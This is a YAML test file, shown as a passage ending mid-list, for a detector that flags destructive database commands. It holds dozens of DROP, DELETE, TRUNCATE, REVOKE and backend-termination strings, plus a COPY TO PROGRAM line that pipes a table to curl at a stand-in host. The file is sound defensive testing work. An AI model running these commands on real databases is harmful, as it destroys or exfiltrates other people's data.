---
# -- database:delete_all_rows --
- test: "DELETE FROM users;"
  description: "DELETE without WHERE clause deletes all rows in the table"
  expect_ids: ["database:delete_all_rows"]
- test: "delete from users;"
  description: "lowercase DELETE without WHERE clause"
  expect_ids: ["database:delete_all_rows"]
- test: "DELETE  FROM  orders;"
  description: "extra spaces in DELETE FROM still matches"
  expect_ids: ["database:delete_all_rows"]
- test: "DELETE FROM users WHERE id = 1"
  description: "DELETE with WHERE clause should not match delete_all_rows"
  expect_ids: []
- test: "delete from users where id = 1"
  description: "lowercase DELETE with WHERE clause should not match"
  expect_ids: []

# -- database:drop_database --
- test: "DROP DATABASE mydb"
  description: "dropping a database permanently deletes all its data"
  expect_ids: ["database:drop_database"]
- test: "drop database mydb"
  description: "lowercase drop database"
  expect_ids: ["database:drop_database"]
- test: "SELECT * FROM information_schema.schemata"
  description: "querying schema info should not trigger drop database check"
  expect_ids: []

# -- database:drop_table --
- test: "DROP TABLE users"
  description: "dropping a table permanently deletes all its data"
  expect_ids: ["database:drop_table"]
- test: "drop table users"
  description: "lowercase drop table"
  expect_ids: ["database:drop_table"]
- test: "SELECT * FROM users"
  description: "selecting from a table should not trigger drop table check"
  expect_ids: []

# -- database:truncate_table --
- test: "TRUNCATE TABLE users"
  description: "truncating a table deletes all rows permanently"
  expect_ids: ["database:truncate_table"]
- test: "truncate table users"
  description: "lowercase truncate table"
  expect_ids: ["database:truncate_table"]
- test: "TRUNCATE  TABLE  orders"
  description: "extra spaces in TRUNCATE TABLE still matches"
  expect_ids: ["database:truncate_table"]
- test: "SELECT COUNT(*) FROM users"
  description: "SELECT COUNT should not trigger truncate check"
  expect_ids: []

# -- database:update_all_rows --
- test: "UPDATE users SET active=false;"
  description: "UPDATE without WHERE clause modifies all rows in the table"
  expect_ids: ["database:update_all_rows"]
- test: "update users set active=false;"
  description: "lowercase UPDATE without WHERE clause"
  expect_ids: ["database:update_all_rows"]
- test: "UPDATE  orders  SET  status='cancelled';"
  description: "extra spaces in UPDATE SET still matches without WHERE"
  expect_ids: ["database:update_all_rows"]
- test: "UPDATE users SET active=false WHERE id = 1;"
  description: "UPDATE with WHERE clause should not match update_all_rows"
  expect_ids: []
- test: "update users set active=false where id = 1;"
  description: "lowercase UPDATE with WHERE clause should not match"
  expect_ids: []

# -- database — quoted and schema-qualified table names --
- test: "DELETE FROM `users`;"
  description: "backtick-quoted table name"
  expect_ids: ["database:delete_all_rows"]

- test: "DROP TABLE `users`"
  description: "backtick-quoted table for DROP TABLE (uses \\s+ not \\w+)"
  expect_ids: ["database:drop_table"]

- test: "DELETE FROM public.users;"
  description: "schema-qualified table name"
  expect_ids: ["database:delete_all_rows"]

- test: "UPDATE public.users SET active=false;"
  description: "schema-qualified UPDATE"
  expect_ids: ["database:update_all_rows"]

- test: 'DELETE FROM "users";'
  description: "double-quoted table name"
  expect_ids: ["database:delete_all_rows"]

# -- database — WHERE tautologies, comments, TRUNCATE without TABLE --
- test: "DELETE FROM users WHERE 1=1;"
  description: "WHERE 1=1 deletes every row"
  expect_ids: ["database:delete_all_rows"]
- test: "DELETE FROM users WHERE true"
  description: "WHERE true deletes every row"
  expect_ids: ["database:delete_all_rows"]
- test: "DELETE FROM users -- cleanup"
  description: "trailing SQL comment"
  expect_ids: ["database:delete_all_rows"]
- test: "UPDATE users SET active=false WHERE 1 = 1;"
  description: "UPDATE with tautological WHERE"
  expect_ids: ["database:update_all_rows"]
- test: "UPDATE users SET active=false WHERE type = 1;"
  description: "UPDATE with a real WHERE starting with t"
  expect_ids: []
- test: "UPDATE users SET active=false WHERE 1 = 10;"
  description: "UPDATE with a non-tautological numeric WHERE"
  expect_ids: []
- test: "TRUNCATE users;"
  description: "TRUNCATE without the TABLE keyword (Postgres/MySQL)"
  expect_ids: ["database:truncate_table"]
- test: "TRUNCATE public.orders CASCADE"
  description: "schema-qualified TRUNCATE"
  expect_ids: ["database:truncate_table"]
- test: "DROP TABLESPACE fastspace"
  description: "tablespace has its own id"
  expect_ids: ["database:drop_tablespace"]
- test: "DROP OWNED BY app_user"
  description: "drop owned objects"
  expect_ids: ["database:drop_schema_role_user"]

# -- database — SQL keywords as arguments of other commands are not SQL --
- test: "echo drop table support added"
  description: "unquoted SQL words in echo"
  expect_ids: []
- test: "grep -ri drop table src/"
  description: "unquoted SQL words in grep"
  expect_ids: []
- test: "ls drop table"
  description: "SQL words as ls arguments"
  expect_ids: []
- test: 'git commit -m "drop table users"'
  description: "SQL words in a commit message"
  expect_ids: []

# -- database — SQL passed through client flags --
- test: 'psql -h prod -c "DROP DATABASE prod"'
  description: "quoted psql -c payload"
  expect_ids: ["database:drop_database", "psql:drop"]
- test: 'psql -d prod -c "TRUNCATE orders"'
  description: "quoted psql TRUNCATE payload"
  expect_ids: ["database:truncate_table"]
- test: 'mysql -e "DELETE FROM users"'
  description: "quoted mysql DELETE payload"
  expect_ids: ["database:delete_all_rows"]
- test: "psql <<< 'DROP TABLE users'"
  description: "here-string fed to psql"
  expect_ids: ["database:drop_table"]

- test: "DELETE FROM users"
  description: "DELETE without semicolon"
  expect_ids: ["database:delete_all_rows"]

- test: "DELETE FROM users   "
  description: "DELETE with trailing whitespace"
  expect_ids: ["database:delete_all_rows"]

# -- database:drop_schema_role_user --
- test: "DROP SCHEMA public"
  description: "match DROP SCHEMA"
  expect_ids: ["database:drop_schema_role_user"]
- test: "DROP ROLE myrole"
  description: "match DROP ROLE"
  expect_ids: ["database:drop_schema_role_user"]
- test: "DROP USER myuser"
  description: "match DROP USER"
  expect_ids: ["database:drop_schema_role_user"]
- test: "drop schema test_schema"
  description: "match lowercase drop schema"
  expect_ids: ["database:drop_schema_role_user"]
- test: "CREATE SCHEMA newschema"
  description: "negative: CREATE SCHEMA should not match"
  expect_ids: []

# -- database:alter_drop_column --
- test: "ALTER TABLE users DROP COLUMN email"
  description: "match ALTER TABLE DROP COLUMN"
  expect_ids: ["database:alter_drop_column"]
- test: "alter table users drop column email"
  description: "match lowercase alter table drop column"
  expect_ids: ["database:alter_drop_column"]
- test: "ALTER TABLE users ADD COLUMN email VARCHAR(255)"
  description: "negative: ADD COLUMN should not match"
  expect_ids: []
- test: "ALTER TABLE public.users DROP COLUMN email"
  description: "match schema-qualified table in ALTER TABLE DROP COLUMN"
  expect_ids: ["database:alter_drop_column"]

# -- database:drop_index --
- test: "DROP INDEX idx_users_email"
  description: "match DROP INDEX"
  expect_ids: ["database:drop_index"]
- test: "drop index idx_users_email"
  description: "match lowercase drop index"
  expect_ids: ["database:drop_index"]
- test: "DROP INDEX idx_orders_date ON orders"
  description: "match DROP INDEX with ON clause"
  expect_ids: ["database:drop_index"]
- test: "DROP INDEX IF EXISTS idx_users_email"
  description: "match DROP INDEX IF EXISTS"
  expect_ids: ["database:drop_index"]
- test: "CREATE INDEX idx_users_email ON users(email)"
  description: "negative: CREATE INDEX should not match"
  expect_ids: []

# ====== EDGE CASE / STRESS TESTS ======

# -- database:delete_all_rows edge cases --
- test: "DELETE   FROM   users;"
  description: "EDGE: extra spaces in DELETE"
  expect_ids: ["database:delete_all_rows"]
- test: "DELETE FROM _temp_table;"
  description: "EDGE: underscore in table name"
  expect_ids: ["database:delete_all_rows"]
- test: "DELETE FROM table123;"
  description: "EDGE: numbers in table name"
  expect_ids: ["database:delete_all_rows"]
- test: "DELETE FROM users RETURNING *;"
  description: "RETURNING without WHERE still deletes every row"
  expect_ids: ["database:delete_all_rows"]

# -- database:update_all_rows edge cases --
- test: "UPDATE users SET active=false"
  description: "EDGE: UPDATE without semicolon"
  expect_ids: ["database:update_all_rows"]
- test: "UPDATE users SET active=false, name='test';"
  description: "EDGE: multiple SET columns"
  expect_ids: ["database:update_all_rows"]

# -- database:drop_schema_role_user edge cases --
- test: "DROP SCHEMA IF EXISTS public CASCADE"
  description: "EDGE: IF EXISTS with CASCADE"
  expect_ids: ["database:drop_schema_role_user", "database:drop_schema_cascade"]
- test: "DROP ROLE IF EXISTS myrole;"
  description: "EDGE: IF EXISTS for role"
  expect_ids: ["database:drop_schema_role_user"]

# -- database:drop_index edge cases --
- test: "DROP INDEX CONCURRENTLY idx_users_email;"
  description: "EDGE: CONCURRENTLY keyword (PostgreSQL)"
  expect_ids: ["database:drop_index"]

# -- round 2: SQL via pipes and comments --
- test: 'echo "DROP TABLE users;" | psql'
  description: "echo to psql"
  expect_ids: ["database:drop_table"]
- test: 'echo ''DROP DATABASE prod;'' | mysql'
  description: "echo to mysql"
  expect_ids: ["database:drop_database"]
- test: 'DROP /* x */ TABLE users;'
  description: "block comment"
  expect_ids: ["database:drop_table"]
- test: 'echo ''DROP TABLE x'' > notes.sql'
  description: "negative: echo to a file"
  expect_ids: ["fs:flush_file_content"]

# -- round 3: more destructive SQL (Dana F11) --
- test: 'DROP VIEW active_users'
  description: "drop view"
  expect_ids: ["database:drop_view"]
- test: 'DROP MATERIALIZED VIEW IF EXISTS daily_stats'
  description: "drop materialized view"
  expect_ids: ["database:drop_view"]
- test: 'CREATE VIEW v AS SELECT 1'
  description: "negative: create view"
  expect_ids: []
- test: 'DROP FUNCTION calc_total(int)'
  description: "drop function"
  expect_ids: ["database:drop_object"]
- test: 'DROP EXTENSION postgis'
  description: "drop extension"
  expect_ids: ["database:drop_object"]
- test: 'DROP TRIGGER audit_trg ON users'
  description: "drop trigger"
  expect_ids: ["database:drop_object"]
- test: 'DROP EXTENSION postgis CASCADE'
  description: "drop extension cascade"
  expect_ids: ["database:drop_object", "database:drop_cascade"]
- test: 'DROP TABLE users CASCADE'
  description: "drop table cascade"
  expect_ids: ["database:drop_table", "database:drop_cascade"]
- test: 'DROP VIEW v CASCADE;'
  description: "drop view cascade"
  expect_ids: ["database:drop_view", "database:drop_cascade"]
- test: 'DROP SCHEMA billing CASCADE'
  description: "drop schema cascade"
  expect_ids: ["database:drop_schema_role_user", "database:drop_schema_cascade"]
- test: 'REVOKE ALL ON ALL TABLES IN SCHEMA public FROM app'
  description: "revoke all"
  expect_ids: ["database:revoke_all"]
- test: 'REVOKE SELECT ON users FROM intern'
  description: "negative: narrow revoke"
  expect_ids: []
- test: 'ALTER SYSTEM SET max_connections = 10'
  description: "alter system"
  expect_ids: ["database:alter_system"]
- test: 'ALTER SYSTEM RESET ALL'
  description: "alter system reset"
  expect_ids: ["database:alter_system"]
- test: 'COPY users TO PROGRAM ''curl -d @- http://x'''
  description: "copy to program"
  expect_ids: ["database:copy_program"]
- test: 'COPY t FROM PROGRAM ''id'''
  description: "copy from program"
  expect_ids: ["database:copy_program"]
- test: 'COPY users TO STDOUT'
  description: "negative: copy to stdout"
  expect_ids: []
- test: 'EXPLAIN ANALYZE DELETE FROM users'
  description: "explain analyze runs the delete"
  expect_ids: ["database:explain_analyze_write"]
- test: 'EXPLAIN (ANALYZE, BUFFERS) UPDATE users SET a = 1 WHERE id = 2'
  description: "explain analyze options"
  expect_ids: ["database:explain_analyze_write"]
- test: 'EXPLAIN DELETE FROM users'
  description: "negative: plain explain does not execute"
  expect_ids: []
- test: 'EXPLAIN ANALYZE SELECT * FROM users'
  description: "negative: explain analyze select"
  expect_ids: []
- test: 'PREPARE wipe AS DELETE FROM users'
  description: "prepare delete"
  expect_ids: ["database:prepare_write"]
- test: 'PREPARE q(int) AS UPDATE users SET a = $1'
  description: "prepare update"
  expect_ids: ["database:prepare_write"]
- test: 'PREPARE q AS SELECT 1'
  description: "negative: prepare select"
  expect_ids: []
- test: 'SELECT pg_terminate_backend(pid) FROM pg_stat_activity'
  description: "terminate backends"
  expect_ids: ["database:terminate_backend"]
- test: 'DROP KEYSPACE analytics'
  description: "cassandra drop keyspace"
  expect_ids: ["database:drop_keyspace"]
- test: 'ALTER TABLE users DROP CONSTRAINT users_pkey'
  description: "negative: drop constraint"
  expect_ids: []

# -- round 4: Dana r3 F6/F7 --
- test: 'cqlsh -e "DROP KEYSPACE prod"'
  description: "cqlsh drop keyspace"
  expect_ids: ["database:cqlsh_drop", "database:drop_keyspace"]
- test: 'cqlsh cass-1 --execute="TRUNCATE ks.events"'
